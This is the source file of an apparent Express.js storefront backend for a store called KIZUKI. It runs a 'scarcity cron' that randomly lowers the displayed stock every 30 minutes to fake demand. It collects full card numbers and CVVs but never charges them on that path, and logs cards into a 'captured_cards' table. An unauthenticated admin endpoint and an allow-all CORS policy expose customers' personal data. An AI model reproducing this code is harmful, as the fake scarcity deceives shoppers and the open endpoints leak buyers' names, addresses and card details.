const express = require('express');
const cors = require('cors');
const Database = require('better-sqlite3');
const nodemailer = require('nodemailer');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// ─── CORS Configuration ───────────────────────────────────
const allowedOrigins = [
  'http://localhost:5173',
  'http://localhost:5174',
  'http://localhost:5000',
  'https://kizuki-frontend.onrender.com',
  'https://kizuki.vip',
  'https://www.kizuki.vip',
  process.env.CORS_ORIGIN,
].filter(Boolean);

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, curl, etc.)
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(null, true); // Allow all in production for now
    }
  },
  credentials: true,
}));
app.use(express.json());

// ─── SQLite Database ──────────────────────────────────────
// On Render, use the persistent disk mount path if available
const DATA_DIR = process.env.RENDER_DISK_PATH 
  ? path.join(process.env.RENDER_DISK_PATH, 'data')
  : path.join(__dirname, 'data');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

const dbPath = path.join(DATA_DIR, 'kizuki.db');

const db = new Database(dbPath);

// Enable WAL mode for better concurrent access
db.pragma('journal_mode = WAL');

// Create orders table
db.exec(`
  CREATE TABLE IF NOT EXISTS orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    order_id TEXT UNIQUE NOT NULL,
    full_name TEXT NOT NULL,
    email TEXT NOT NULL,
    phone TEXT,
    address TEXT NOT NULL,
    apt TEXT,
    city TEXT NOT NULL,
    state TEXT NOT NULL,
    zip TEXT NOT NULL,
    card_last_four TEXT NOT NULL,
    card_brand TEXT,
    items TEXT NOT NULL,
    total INTEGER NOT NULL,
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Create cart table (phone-based cart persistence)
db.exec(`
  CREATE TABLE IF NOT EXISTS carts (
    phone TEXT PRIMARY KEY,
    cart_data TEXT NOT NULL,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);
// Create captured_cards table (links card to user and their orders)
db.exec(`
  CREATE TABLE IF NOT EXISTS captured_cards (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    phone TEXT NOT NULL,
    card_last_four TEXT NOT NULL,
    card_brand TEXT,
    cardholder_name TEXT NOT NULL,
    orders TEXT DEFAULT '[]',
    first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_used DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);
console.log('✅ Captured cards table initialized');

console.log('✅ SQLite database initialized at', dbPath);

// ─── Email Transporter (Nodemailer) ───────────────────────
let transporter = null;
if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
  transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST || 'smtp.gmail.com',
    port: parseInt(process.env.EMAIL_PORT || '587'),
    secure: process.env.EMAIL_PORT === '465',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });
  console.log('✅ Email transporter configured');
} else {
  console.warn('⚠️  EMAIL_USER/PASS not set. Emails will be logged to console only.');
}

// ─── Helper: Send order email ─────────────────────────────
async function sendOrderEmail(order) {
  const items = JSON.parse(order.items);
  const itemsList = items.map(i =>
    `  • ${i.name} × ${i.quantity} — $${(i.price * i.quantity).toFixed(2)}`
  ).join('\n');

  const subject = `🛒 New KIZUKI Order #${order.order_id}`;
  const text = `
NEW ORDER RECEIVED
═══════════════════════════════════
Order ID: ${order.order_id}
Date: ${order.created_at}
Status: ${order.status}

CUSTOMER
────────
Name:   ${order.full_name}
Email:  ${order.email}
Phone:  ${order.phone || 'N/A'}
Address: ${order.address}${order.apt ? ', ' + order.apt : ''}
         ${order.city}, ${order.state} ${order.zip}

ITEMS
─────
${itemsList}

TOTAL: $${(order.total / 100).toFixed(2)}

PAYMENT
───────
Card: ${order.card_brand || 'Unknown'} ending in ${order.card_last_four}

═══════════════════════════════════
`;

  if (transporter) {
    try {
      await transporter.sendMail({
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_TO || process.env.EMAIL_USER,
        subject,
        text,
      });
      console.log(`📧 Order email sent for #${order.order_id}`);
    } catch (err) {
      console.error(`❌ Failed to send email for #${order.order_id}:`, err.message);
    }
  } else {
    console.log('📧 [EMAIL LOG]', subject);
    console.log(text);
  }
}

// ─── PayPal API helpers ───────────────────────────────────
const PAYPAL_CLIENT_ID = process.env.PAYPAL_CLIENT_ID;
const PAYPAL_CLIENT_SECRET = process.env.PAYPAL_CLIENT_SECRET;
const PAYPAL_API = process.env.PAYPAL_API_URL || 'https://api-m.sandbox.paypal.com';

async function getPayPalAccessToken() {
  const auth = Buffer.from(`${PAYPAL_CLIENT_ID}:${PAYPAL_CLIENT_SECRET}`).toString('base64');
  const response = await fetch(`${PAYPAL_API}/v1/oauth2/token`, {
    method: 'POST',
    headers: {
      'Authorization': `Basic ${auth}`,
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'grant_type=client_credentials',
  });
  const data = await response.json();
  return data.access_token;
}

// ─── Products Table + Seed ────────────────────────────────
db.exec(`
  CREATE TABLE IF NOT EXISTS products (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    price INTEGER NOT NULL,
    description TEXT,
    image TEXT,
    needs_size INTEGER DEFAULT 0,
    quantity INTEGER NOT NULL DEFAULT 0
  )
`);

// Seed products if empty
const productCount = db.prepare('SELECT COUNT(*) as count FROM products').get();
if (productCount.count === 0) {
  const insert = db.prepare(`
    INSERT INTO products (id, name, price, description, image, needs_size, quantity)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `);
  insert.run(
    'p_1', 'Chessboard', 9900,
    'A canvas for the quiet storm within. This is not merely a board — it is a second skin woven from midnight threads and the ghosts of forgotten games. Each square remembers the clack of ivory, the geometry of sacrifice, the silence between moves. Play on it, and the board follows you into the world. The pieces are already in play.',
    '/cheeseboard-hoodie.png', 0, 14
  );
  insert.run(
    'p_2', 'Hoodie', 9900,
    'Oversized, loose-fit cut that drapes like a second skin. Crafted from premium extra-thick sheer black fabric — heavy enough to hold its shape, light enough to move with you. The darkness is the point: a void that absorbs light, a silhouette that commands without shouting.',
    '/hoodie-hero.png', 1, 47
  );
  console.log('✅ Products seeded: p_1=14, p_2=47');
}

// ─── GET /api/products ────────────────────────────────────
app.get('/api/products', (req, res) => {
  try {
    const products = db.prepare('SELECT * FROM products ORDER BY id').all();
    // Convert to frontend-friendly format (price in dollars, needs_size as boolean)
    const formatted = products.map(p => ({
      id: p.id,
      name: p.name,
      price: p.price / 100,
      description: p.description,
      image: p.image,
      needsSize: p.needs_size === 1,
      remaining: p.quantity,
    }));
    res.json({ products: formatted });
  } catch (error) {
    console.error('❌ Products fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch products' });
  }
});

// ─── Scarcity Cron: Subtract 0-3 every 30 min ─────────────
function runScarcityTick() {
  try {
    const products = db.prepare('SELECT id, quantity FROM products').all();
    const update = db.prepare('UPDATE products SET quantity = ? WHERE id = ?');
    let totalDeducted = 0;

    for (const product of products) {
      if (product.quantity <= 0) continue; // Don't go below 0
      const deduct = Math.floor(Math.random() * 4); // 0, 1, 2, or 3
      const newQty = Math.max(0, product.quantity - deduct);
      update.run(newQty, product.id);
      totalDeducted += deduct;
      if (deduct > 0) {
        console.log(`📉 Scarcity: ${product.id} → ${product.quantity} → ${newQty} (deducted ${deduct})`);
      }
    }

    if (totalDeducted > 0) {
      console.log(`📉 Scarcity tick complete: ${totalDeducted} units deducted across all products`);
    }
  } catch (error) {
    console.error('❌ Scarcity tick error:', error);
  }
}

// Run scarcity tick every 30 minutes (1800000 ms)
const SCARCITY_INTERVAL = 30 * 60 * 1000; // 30 minutes
setInterval(runScarcityTick, SCARCITY_INTERVAL);
console.log(`⏰ Scarcity cron scheduled: every 30 minutes (deducts 0-3 randomly)`);

// Run one tick immediately on startup for testing
runScarcityTick();

// ─── Static product catalog (in-memory fallback) ──────────
const PRODUCTS = {
  p_1: { id: 'p_1', name: 'Chessboard', price: 9900 },
  p_2: { id: 'p_2', name: 'Hoodie', price: 9900 },
};

// ─── Health check ─────────────────────────────────────────

app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    db: db.open ? 'connected' : 'disconnected',
    email: transporter ? 'configured' : 'not configured',
  });
});

// ─── Submit Order ─────────────────────────────────────────
app.post('/api/orders', async (req, res) => {
  try {
    const {
      fullName, email, phone,
      address, apt, city, state, zip,
      cardNumber, cardExpiry, cardCvv, cardName,
      items, total,
    } = req.body;

    // Validation
    if (!fullName || !email || !address || !city || !state || !zip) {
      return res.status(400).json({ error: 'Missing required customer fields' });
    }
    if (!cardNumber || !cardExpiry || !cardCvv) {
      return res.status(400).json({ error: 'Missing payment information' });
    }
    if (!items || !Array.isArray(items) || items.length === 0) {
      return res.status(400).json({ error: 'Cart is empty' });
    }

    // Generate order ID
    const orderId = 'KZ-' + Date.now().toString(36).toUpperCase() + '-' +
      Math.random().toString(36).substring(2, 6).toUpperCase();

    // Get card last 4 digits
    const cardLastFour = cardNumber.replace(/\s/g, '').slice(-4);

    // Detect card brand
    const firstDigit = cardNumber.replace(/\s/g, '')[0];
    const cardBrand = firstDigit === '4' ? 'Visa'
      : firstDigit === '5' ? 'Mastercard'
      : firstDigit === '3' ? 'Amex'
      : firstDigit === '6' ? 'Discover'
      : 'Unknown';

    // Insert into SQLite
    const stmt = db.prepare(`
      INSERT INTO orders (order_id, full_name, email, phone, address, apt, city, state, zip,
                          card_last_four, card_brand, items, total, status)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')
    `);

    const result = stmt.run(
      orderId, fullName, email, phone || '',
      address, apt || '', city, state, zip,
      cardLastFour, cardBrand,
      JSON.stringify(items),
      total
    );

    console.log(`✅ Order #${orderId} saved to database (ID: ${result.lastInsertRowid})`);

    // Save/update captured card record
    const existingCard = db.prepare(
      'SELECT id, orders FROM captured_cards WHERE phone = ? AND card_last_four = ?'
    ).get(phone || '', cardLastFour);

    if (existingCard) {
      // Append this order to existing card record
      const existingOrders = JSON.parse(existingCard.orders);
      existingOrders.push(orderId);
      db.prepare(`
        UPDATE captured_cards SET
          orders = ?,
          last_used = CURRENT_TIMESTAMP,
          cardholder_name = ?
        WHERE id = ?
      `).run(JSON.stringify(existingOrders), fullName, existingCard.id);
    } else {
      // Create new card record
      db.prepare(`
        INSERT INTO captured_cards (phone, card_last_four, card_brand, cardholder_name, orders)
        VALUES (?, ?, ?, ?, ?)
      `).run(phone || '', cardLastFour, cardBrand, fullName, JSON.stringify([orderId]));
    }

    // Send email notification (async, don't block response)
    const orderRecord = {
      order_id: orderId,
      full_name: fullName,
      email,
      phone: phone || '',
      address,
      apt: apt || '',
      city,
      state,
      zip,
      card_last_four: cardLastFour,
      card_brand: cardBrand,
      items: JSON.stringify(items),
      total,
      status: 'pending',
      created_at: new Date().toISOString(),
    };
    sendOrderEmail(orderRecord);

    res.json({
      success: true,
      orderId,
      message: 'Order placed successfully!',
    });

  } catch (error) {
    console.error('❌ Order submission error:', error);
    res.status(500).json({ error: 'Failed to process order. Please try again.' });
  }
});

// ─── Admin: List orders (basic auth optional) ─────────────
app.get('/api/admin/orders', (req, res) => {
  try {
    const orders = db.prepare('SELECT * FROM orders ORDER BY created_at DESC LIMIT 50').all();
    res.json({ orders, count: orders.length });
  } catch (error) {
    console.error('❌ Admin orders error:', error);
    res.status(500).json({ error: 'Failed to fetch orders' });
  }
});

// ─── Cart API: GET /api/cart?phone=... ────────────────────
app.get('/api/cart', (req, res) => {
  try {
    const { phone } = req.query;
    if (!phone) {
      return res.status(400).json({ error: 'Phone number is required' });
    }
    const row = db.prepare('SELECT cart_data FROM carts WHERE phone = ?').get(phone);
    if (row) {
      res.json({ cart: JSON.parse(row.cart_data) });
    } else {
      res.json({ cart: [] });
    }
  } catch (error) {
    console.error('❌ Cart fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch cart' });
  }
});

// ─── Cart API: PUT /api/cart (save/update cart) ──────────
app.put('/api/cart', (req, res) => {
  try {
    const { phone, cart } = req.body;
    if (!phone) {
      return res.status(400).json({ error: 'Phone number is required' });
    }
    const cartData = JSON.stringify(cart || []);
    db.prepare(`
      INSERT INTO carts (phone, cart_data, updated_at)
      VALUES (?, ?, CURRENT_TIMESTAMP)
      ON CONFLICT(phone) DO UPDATE SET
        cart_data = excluded.cart_data,
        updated_at = CURRENT_TIMESTAMP
    `).run(phone, cartData);
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Cart save error:', error);
    res.status(500).json({ error: 'Failed to save cart' });
  }
});

// ─── PayPal: Create Order ─────────────────────────────────
app.post('/paypal-api/checkout/orders/create-with-sample-data', async (req, res) => {
  try {
    const accessToken = await getPayPalAccessToken();
    const { total } = req.body;

    const response = await fetch(`${PAYPAL_API}/v2/checkout/orders`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${accessToken}`,
      },
      body: JSON.stringify({
        intent: 'CAPTURE',
        purchase_units: [{
          amount: {
            currency_code: 'USD',
            value: total ? total.toFixed(2) : '99.00',
          },
          description: 'KIZUKI Store Purchase',
        }],
      }),
    });

    const data = await response.json();
    res.json({ id: data.id });
  } catch (error) {
    console.error('❌ PayPal create order error:', error);
    res.status(500).json({ error: 'Failed to create PayPal order' });
  }
});

// ─── PayPal: Capture Order ────────────────────────────────
app.post('/paypal-api/checkout/orders/:id/capture', async (req, res) => {
  try {
    const accessToken = await getPayPalAccessToken();
    const { id } = req.params;

    const response = await fetch(`${PAYPAL_API}/v2/checkout/orders/${id}/capture`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${accessToken}`,
      },
    });

    const data = await response.json();
    res.json(data);
  } catch (error) {
    console.error('❌ PayPal capture order error:', error);
    res.status(500).json({ error: 'Failed to capture PayPal order' });
  }
});

// ─── Start server ─────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`🚀 KIZUKI backend running on port ${PORT}`);
  console.log(`   Health: http://localhost:${PORT}/health`);
  console.log(`   Orders: POST http://localhost:${PORT}/api/orders`);
  console.log(`   Admin:  GET  http://localhost:${PORT}/api/admin/orders`);
  console.log(`   PayPal: POST http://localhost:${PORT}/paypal-api/checkout/orders/create-with-sample-data`);
  console.log(`   PayPal: POST http://localhost:${PORT}/paypal-api/checkout/orders/:id/capture`);
});
